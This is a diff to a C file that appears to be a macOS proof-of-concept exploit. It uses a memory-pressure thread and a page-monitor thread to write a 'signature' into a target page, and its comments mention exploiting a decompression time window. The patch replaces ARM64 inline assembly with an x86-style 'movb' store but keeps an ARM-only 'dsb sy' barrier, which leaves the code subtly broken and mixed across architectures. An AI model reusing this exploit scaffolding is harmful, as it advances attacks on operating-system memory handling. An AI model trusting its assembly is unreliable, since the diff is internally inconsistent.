@@ -45,8 +45,8 @@
 #include <string.h>
 #include <stdbool.h>
 #include <errno.h>
+#include <mach/mach_vm.h>
 #include <dispatch/dispatch.h>
-#include <mach/vm_map.h>
 
 // 定义常量
 #define PAGE_SIZE 4096
@@ -195,18 +195,18 @@ void* page_monitor_thread(void *arg) {
     // 尝试写入签名 - 在真实漏洞中，这里将利用解压缩时间窗口
     printf("[*] 尝试在目标页面写入签名\n");
     
-    // 使用ARM64汇编直接写入内存 (绕过编译器检查)
+    // 使用内联汇编直接写入内存 (绕过编译器检查)
     for (int i = 0; i < strlen(signature); i++) {
         __asm__ volatile (
-            "strb %w1, [%0]"
-            : 
-            : "r" (&target[i]), "r" (signature[i])
+            "movb %1, %0"
+            : "=m" (target[i])
+            : "r" (signature[i])
             : "memory"
         );
     }
     
     // 确保写入完成
-    __asm__ volatile("dsb ish" ::: "memory");
+    __asm__ volatile("dsb sy" ::: "memory");
     
     printf("[+] 页面监控线程完成操作\n");
     return NULL;
@@ -274,7 +274,7 @@ bool verify_exploitation(const char* path) {
 }
 
 // 清理资源
-static void cleanup_resources(memory_pressure_ctx_t *ctx) {
+void cleanup_resources(memory_pressure_ctx_t *ctx) {
     printf("[*] 清理资源\n");
     
     // 停止内存压力线程
